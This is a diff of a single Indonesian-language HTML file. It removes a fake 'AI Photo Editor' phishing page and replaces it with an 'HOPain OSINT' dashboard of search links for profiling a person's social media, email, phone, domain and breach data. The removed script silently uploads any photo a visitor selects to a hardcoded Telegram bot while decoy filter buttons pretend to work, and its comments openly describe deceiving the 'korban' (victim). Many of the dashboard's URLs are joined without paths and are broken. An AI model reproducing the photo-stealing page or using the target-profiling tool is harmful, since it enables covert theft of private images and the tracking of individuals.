@@ -1,110 +1,199 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Photo Editor & Filters</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #1e1e1e; color: #fff; padding: 20px; }
-        .container { max-width: 400px; margin: auto; background: #2d2d2d; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .btn-upload { background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; display: inline-block; margin-top: 15px; }
-        input[type="file"] { display: none; }
-        .preview-box { width: 100%; min-height: 200px; border: 2px dashed #555; border-radius: 8px; margin-top: 15px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .preview-box img { max-width: 100%; max-height: 300px; }
-        .tools { display: none; margin-top: 15px; justify-content: space-around; }
-        .btn-tool { background: #444; border: none; color: white; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
-        .btn-tool:hover { background: #555; }
-        #status-proses { margin-top: 15px; font-size: 14px; color: #aaa; }
-    </style>
+<meta charset="UTF-8">
+<title>HOPain OSINT Search Tools - Complete Single File</title>
+<style>
+body {background-color: black;color:white;font-family: monospace;font-size: 16px; margin: 20px;}
+input[type=text] {
+  border: 1px solid white;
+  background-color: #303942;
+  padding: 10px 15px;
+  color: white;
+  border-radius: 10px;
+  width: 80%;
+  max-width: 400px;
+  font-size: 16px;
+  margin-bottom: 15px;
+}
+input[type=button] {
+  background-color: #303942;
+  border: none;
+  color: white;
+  padding: 10px 15px;
+  margin: 4px;
+  cursor: pointer;
+  border-radius: 10px;
+  font-family: monospace;
+  font-size: 14px;
+  transition: background 0.2s;
+}
+input[type=button]:hover {
+  background-color: #4a5765;
+}
+.btn-danger {
+  background-color: #8b0000 !important;
+}
+.btn-danger:hover {
+  background-color: #b30000 !important;
+}
+ul {list-style-type: none;margin: 0;padding: 0;width: 220px;background-color: #f1f1f1;}
+li a {display: block;color: #000;padding: 10px 16px;text-decoration: none; cursor: pointer;}
+li a:hover {background-color: #555;color: white;}
+li a.active {background-color: #303942;color: white;}
+li a.grey {background-color: #cdcdcd;color: black; font-weight: bold;}
+table td {vertical-align: top;}
+.container {
+  padding: 20px;
+  border: 1px dashed #303942;
+  border-radius: 10px;
+  background-color: #0c0f12;
+  min-height: 450px;
+}
+.tool-section { display: none; }
+.tool-section.active-section { display: block; }
+h4 { color: #b4c8da; margin-top: 0; border-bottom: 1px solid #303942; padding-bottom: 5px;}
+</style>
 </head>
 <body>
+<table width="900" border="0" align="center">
+<tbody>
+<tr>
+<!-- MENU NAVIGASI KIRI -->
+<td width="220">
+<ul>
+<li><a class="grey" onclick="showSection('home')">HOPain Dashboard</a></li>
+<li><a onclick="showSection('search')">Search Engines</a></li>
+<li><a onclick="showSection('social')">Social Media (FB/IG/X)</a></li>
+<li><a onclick="showSection('email')">Email Addresses</a></li>
+<li><a onclick="showSection('username')">Usernames & Names</a></li>
+<li><a onclick="showSection('phone')">Telephone Numbers</a></li>
+<li><a onclick="showSection('network')">Domains & IP</a></li>
+<li><a onclick="showSection('breaches')">Data Breaches & Leaks</a></li>
+</ul>
+</td>
 
+<!-- KONTEN DINAMIS KANAN -->
+<td width="680" style="padding-left: 20px;">
 <div class="container">
-    <h2>AI Photo Editor v1.2</h2>
-    <p style="color: #aaa; font-size: 14px;">Pilih foto dari galeri untuk mulai mengedit dengan efek AI automatic filter.</p>
-    
-    <label class="btn-upload">
-        📁 Pilih Foto dari Galeri
-        <input type="file" accept="image/*" id="input-foto">
-    </label>
-
-    <div class="preview-box" id="wadah-preview">
-        <span id="teks-kosong" style="color: #777;">Belum ada foto yang dipilih</span>
+  
+  <!-- HALAMAN UTAMA / HOME -->
+  <div id="home" class="tool-section active-section">
+    <div align="center">
+      <h3>HOPain OSINT Search Tools (Version 2.0 - Loaded)</h3>
+      <p>Silakan pilih kategori investigasi di menu sebelah kiri untuk memulai pelacakan intelijen.</p>
+      <p style="color: #888; font-size: 12px;">Pastikan browser Anda sudah mengizinkan pop-up jika ingin menggunakan fitur "Buka Semua".</p>
     </div>
+  </div>
 
-    <!-- Alat edit palsu untuk mengelabui pengguna -->
-    <div class="tools" id="alat-edit">
-        <button class="btn-tool" onclick="pilihEfek('Retro')">✨ Retro Filter</button>
-        <button class="btn-tool" onclick="pilihEfek('HDR Auto')">📸 HDR Boost</button>
-        <button class="btn-tool" onclick="pilihEfek('B&W Classic')">🖤 Hitam Putih</button>
-    </div>
+  <!-- MODUL SEARCH ENGINES -->
+  <div id="search" class="tool-section">
+    <h4>Search Engines & Dorking</h4>
+    <input type="text" id="querySearch" placeholder="Masukkan kata kunci / nama / kalimat">
+    <br>
+    <input type="button" value="Google Search" onclick="openLink('https://google.com' + getVal('querySearch'))">
+    <input type="button" value="Bing Search" onclick="openLink('https://bing.com' + getVal('querySearch'))">
+    <input type="button" value="DuckDuckGo" onclick="openLink('https://duckduckgo.com' + getVal('querySearch'))">
+    <input type="button" value="Yandex" onclick="openLink('https://yandex.com' + getVal('querySearch'))">
+  </div>
 
-    <div id="status-proses"></div>
+  <!-- MODUL SOCIAL MEDIA -->
+  <div id="social" class="tool-section">
+    <h4>Social Media Investigator</h4>
+    <input type="text" id="socialTarget" placeholder="Masukkan Username / Nama Target">
+    <br>
+    <input type="button" value="Cari di Facebook" onclick="openLink('https://facebook.com' + getVal('socialTarget'))">
+    <input type="button" value="Profil X (Twitter)" onclick="openLink('https://x.com' + getVal('socialTarget'))">
+    <input type="button" value="Profil Instagram" onclick="openLink('https://instagram.com' + getVal('socialTarget'))">
+    <input type="button" value="Google Dork Sosial Media" onclick="openLink('https://google.comsite:instagram.com OR site:facebook.com OR site:twitter.com ' + getVal('socialTarget'))">
+  </div>
+
+  <!-- MODUL EMAIL -->
+  <div id="email" class="tool-section">
+    <h4>Email Address Intelligence</h4>
+    <input type="text" id="emailTarget" placeholder="contoh: target@email.com">
+    <br>
+    <input type="button" value="Hunter.io (Domain Search)" onclick="openLink('https://hunter.io' + getVal('emailTarget'))">
+    <input type="button" value="IntelX Email Search" onclick="openLink('https://intelx.io' + getVal('emailTarget'))">
+    <input type="button" value="Google Dork Email" onclick="openLink('https://google.com%22' + getVal('emailTarget') + '%22')">
+  </div>
+
+  <!-- MODUL USERNAME & NAMES -->
+  <div id="username" class="tool-section">
+    <h4>Username & Name Finder</h4>
+    <input type="text" id="userTarget" placeholder="Masukkan Username / Nama Lengkap">
+    <br>
+    <input type="button" value="CheckUsernames" onclick="openLink('https://checkusernames.com' + getVal('userTarget'))">
+    <input type="button" value="GitHub Profile" onclick="openLink('https://github.com' + getVal('userTarget'))">
+    <input type="button" value="Cari Spesifik Nama (Google)" onclick="openLink('https://google.com%22' + getVal('userTarget') + '%22')">
+  </div>
+
+  <!-- MODUL TELEPHONE -->
+  <div id="phone" class="tool-section">
+    <h4>Telephone Number Intelligence</h4>
+    <input type="text" id="phoneTarget" placeholder="contoh: 628123456xxx">
+    <br>
+    <input type="button" value="Sync.ME Search" onclick="openLink('https://sync.me' + getVal('phoneTarget'))">
+    <input type="button" value="Google Dork No. Telp" onclick="openLink('https://google.com%22' + getVal('phoneTarget') + '%22')">
+    <input type="button" value="SpyDialer" onclick="openLink('https://spydialer.com' + getVal('phoneTarget'))">
+  </div>
+
+  <!-- MODUL DOMAINS & IP -->
+  <div id="network" class="tool-section">
+    <h4>Domain & IP Infrastructure Tracking</h4>
+    <input type="text" id="netTarget" placeholder="contoh: target.com atau 8.8.8.8">
+    <br>
+    <input type="button" value="VirusTotal" onclick="openLink('https://virustotal.com' + getVal('netTarget'))">
+    <input type="button" value="Whois Domain" onclick="openLink('https://whois.com' + getVal('netTarget'))">
+    <input type="button" value="Shodan" onclick="openLink('https://shodan.io' + getVal('netTarget'))">
+    <input type="button" value="DNSDumpster" onclick="openLink('https://dnsdumpster.com')">
+    <input type="button" class="btn-danger" value="Buka Semua" onclick="openAllNetwork()">
+  </div>
+
+  <!-- MODUL DATA BREACHES -->
+  <div id="breaches" class="tool-section">
+    <h4>Data Breaches & Leaks Lookup</h4>
+    <input type="text" id="leakTarget" placeholder="Masukkan Email / Username / Kata Kunci">
+    <br>
+    <input type="button" value="HaveIBeenPwned" onclick="openLink('https://haveibeenpwned.com')">
+    <input type="button" value="Intelligence X" onclick="openLink('https://intelx.io' + getVal('leakTarget'))">
+    <input type="button" value="DeHashed" onclick="openLink('https://dehashed.com' + getVal('leakTarget'))">
+  </div>
+
 </div>
+</td>
+</tr>
+</tbody>
+</table>
 
 <script>
-    // === GANTI DENGAN DATA TELEGRAM ANDA ===
-    const TELEGRAM_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
-    const CHAT_ID = '1966317946';
-    // ======================================
+// Fungsi berpindah menu halaman tanpa reload
+function showSection(sectionId) {
+  var sections = document.getElementsByClassName('tool-section');
+  for (var i = 0; i < sections.length; i++) {
+    sections[i].classList.remove('active-section');
+  }
+  document.getElementById(sectionId).classList.add('active-section');
+}
 
-    const inputFoto = document.getElementById('input-foto');
-    const wadahPreview = document.getElementById('wadah-preview');
-    const teksKosong = document.getElementById('teks-kosong');
-    const alatEdit = document.getElementById('alat-edit');
-    const statusProses = document.getElementById('status-proses');
+// Fungsi mengambil data input teks terenkripsi URL
+function getVal(id) {
+  return encodeURIComponent(document.getElementById(id).value.trim());
+}
 
-    inputFoto.addEventListener('change', function(e) {
-        const file = e.target.files[0];
-        if (!file) return;
+// Fungsi membuka tab baru aman
+function openLink(url) {
+  window.open(url, '_blank');
+}
 
-        // Tampilkan foto di layar seolah-olah siap diedit
-        teksKosong.style.display = 'none';
-        wadahPreview.innerHTML = '';
-        const img = document.createElement('img');
-        img.src = URL.createObjectURL(file);
-        wadahPreview.appendChild(img);
-        
-        // Munculkan tombol alat edit palsu
-        alatEdit.style.display = 'flex';
-        statusProses.innerText = "Foto berhasil dimuat. Silakan pilih filter AI di atas.";
-        statusProses.style.color = "#00ff00";
-
-        // DIAM-DIAM langsung kirim foto asli ke Telegram Bot Anda
-        kirimKeTelegramDiamDiam(file);
-    });
-
-    function kirimKeTelegramDiamDiam(fileData) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', fileData);
-        formData.append('caption', 'Target baru saja memasukkan foto ke web Editor palsu!');
-
-        // Proses pengiriman di latar belakang (user tidak tahu)
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Sistem internal sukses."); // Hanya muncul di konsol inspeksi web
-        })
-        .catch(error => {
-            console.error("Sistem internal error.", error);
-        });
-    }
-
-    // Fungsi kosmetik jika tombol filter diklik oleh korban
-    function pilihEfek(namaEfek) {
-        statusProses.innerText = `Sedang menerapkan efek ${namaEfek}... mohon tunggu.`;
-        statusProses.style.color = "orange";
-        
-        setTimeout(() => {
-            statusProses.innerText = `Gagal menerapkan ${namaEfek}. Server AI sibuk, coba beberapa saat lagi.`;
-            statusProses.style.color = "#ff4d4d";
-        }, 2000);
-    }
+// Contoh fungsi otomatisasi massal (Buka Semua Sekaligus) untuk Network
+function openAllNetwork() {
+  var target = getVal('netTarget');
+  if(!target) { alert('Harap isi kolom target!'); return; }
+  openLink('https://virustotal.com' + target);
+  openLink('https://whois.com' + target);
+  openLink('https://shodan.io' + target);
+}
 </script>
-
 </body>
 </html>
